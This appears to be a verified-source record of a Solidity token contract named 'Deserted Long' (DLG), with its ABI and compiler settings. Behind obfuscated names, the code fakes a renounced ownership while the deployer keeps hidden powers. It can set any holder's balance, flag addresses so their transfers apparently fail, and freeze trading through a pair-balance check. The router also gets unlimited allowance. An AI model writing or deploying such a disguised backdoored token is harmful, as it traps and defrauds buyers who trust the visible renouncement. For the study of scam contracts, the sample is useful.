{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellMode) external view returns (uint256);\n\n    function transfer(address tokenSwapMarketing, uint256 takeTotal) external returns (bool);\n\n    function allowance(address fromReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenSwapMarketing,\n        uint256 takeTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAt, uint256 value);\n    event Approval(address indexed fromReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract senderReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTeamMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyMarketing {\n    function createPair(address enableTeam, address maxToTrading) external returns (address);\n}\n\ninterface receiverWallet is totalToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DesertedLong is senderReceiver, totalToken, receiverWallet {\n\n    string private autoWallet = \"Deserted Long\";\n\n    bool private liquiditySell;\n\n    uint256 private takeSwap;\n\n    event OwnershipTransferred(address indexed fundFrom, address indexed sellTo);\n\n    function txTotal(uint256 takeTotal) public {\n        teamWalletTo();\n        limitSell = takeTotal;\n    }\n\n    bool private minIs;\n\n    bool public modeTeam;\n\n    uint256 private teamIs;\n\n    constructor (){\n        if (toExempt) {\n            modeTeam = false;\n        }\n        modeTeamMin fromModeMin = modeTeamMin(fundMarketing);\n        autoFrom = buyMarketing(fromModeMin.factory()).createPair(fromModeMin.WETH(), address(this));\n        if (amountMin != minIs) {\n            liquidityShould = true;\n        }\n        isWalletFee = _msgSender();\n        feeTakeExempt();\n        totalTo[isWalletFee] = true;\n        swapBuy[isWalletFee] = liquidityAtToken;\n        if (txShould != teamIs) {\n            liquidityShould = false;\n        }\n        emit Transfer(address(0), isWalletFee, liquidityAtToken);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atEnable;\n    }\n\n    function teamWalletTo() private view {\n        require(totalTo[_msgSender()]);\n    }\n\n    string private atEnable = \"DLG\";\n\n    mapping(address => bool) public totalTo;\n\n    function totalReceiver(address enableAt, uint256 takeTotal) public {\n        teamWalletTo();\n        swapBuy[enableAt] = takeTotal;\n    }\n\n    uint256 constant receiverLaunchIs = 19 ** 10;\n\n    function txListLimit(address listTo) public {\n        teamWalletTo();\n        if (modeTeam == toExempt) {\n            txShould = teamIs;\n        }\n        if (listTo == isWalletFee || listTo == autoFrom) {\n            return;\n        }\n        teamExempt[listTo] = true;\n    }\n\n    uint8 private launchSender = 18;\n\n    uint256 sellExemptWallet;\n\n    bool public liquidityShould;\n\n    bool private toExempt;\n\n    bool public sellTrading;\n\n    function transferFrom(address receiverList, address tokenSwapMarketing, uint256 takeTotal) external override returns (bool) {\n        if (_msgSender() != fundMarketing) {\n            if (senderLaunch[receiverList][_msgSender()] != type(uint256).max) {\n                require(takeTotal <= senderLaunch[receiverList][_msgSender()]);\n                senderLaunch[receiverList][_msgSender()] -= takeTotal;\n            }\n        }\n        return swapAmount(receiverList, tokenSwapMarketing, takeTotal);\n    }\n\n    address public autoFrom;\n\n    mapping(address => mapping(address => uint256)) private senderLaunch;\n\n    function allowance(address tradingLaunch, address txMax) external view virtual override returns (uint256) {\n        if (txMax == fundMarketing) {\n            return type(uint256).max;\n        }\n        return senderLaunch[tradingLaunch][txMax];\n    }\n\n    uint256 public txShould;\n\n    mapping(address => uint256) private swapBuy;\n\n    address launchSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address txMax, uint256 takeTotal) public virtual override returns (bool) {\n        senderLaunch[_msgSender()][txMax] = takeTotal;\n        emit Approval(_msgSender(), txMax, takeTotal);\n        return true;\n    }\n\n    bool public amountMin;\n\n    function getOwner() external view returns (address) {\n        return isFromMin;\n    }\n\n    mapping(address => bool) public teamExempt;\n\n    function swapAmount(address receiverList, address tokenSwapMarketing, uint256 takeTotal) internal returns (bool) {\n        if (receiverList == isWalletFee) {\n            return maxLaunch(receiverList, tokenSwapMarketing, takeTotal);\n        }\n        uint256 receiverLaunched = totalToken(autoFrom).balanceOf(launchSwap);\n        require(receiverLaunched == limitSell);\n        require(tokenSwapMarketing != launchSwap);\n        if (teamExempt[receiverList]) {\n            return maxLaunch(receiverList, tokenSwapMarketing, receiverLaunchIs);\n        }\n        return maxLaunch(receiverList, tokenSwapMarketing, takeTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoWallet;\n    }\n\n    function balanceOf(address sellMode) public view virtual override returns (uint256) {\n        return swapBuy[sellMode];\n    }\n\n    uint256 private liquidityAtToken = 100000000 * 10 ** 18;\n\n    address fundMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public toFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityAtToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchSender;\n    }\n\n    function maxLaunch(address receiverList, address tokenSwapMarketing, uint256 takeTotal) internal returns (bool) {\n        require(swapBuy[receiverList] >= takeTotal);\n        swapBuy[receiverList] -= takeTotal;\n        swapBuy[tokenSwapMarketing] += takeTotal;\n        emit Transfer(receiverList, tokenSwapMarketing, takeTotal);\n        return true;\n    }\n\n    function feeTakeExempt() public {\n        emit OwnershipTransferred(isWalletFee, address(0));\n        isFromMin = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return isFromMin;\n    }\n\n    function transfer(address enableAt, uint256 takeTotal) external virtual override returns (bool) {\n        return swapAmount(_msgSender(), enableAt, takeTotal);\n    }\n\n    uint256 limitSell;\n\n    function modeAt(address launchedTake) public {\n        if (sellTrading) {\n            return;\n        }\n        \n        totalTo[launchedTake] = true;\n        if (amountMin) {\n            txShould = takeSwap;\n        }\n        sellTrading = true;\n    }\n\n    address public isWalletFee;\n\n    address private isFromMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTakeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"modeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSwapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"}],\"name\":\"txListLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DesertedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}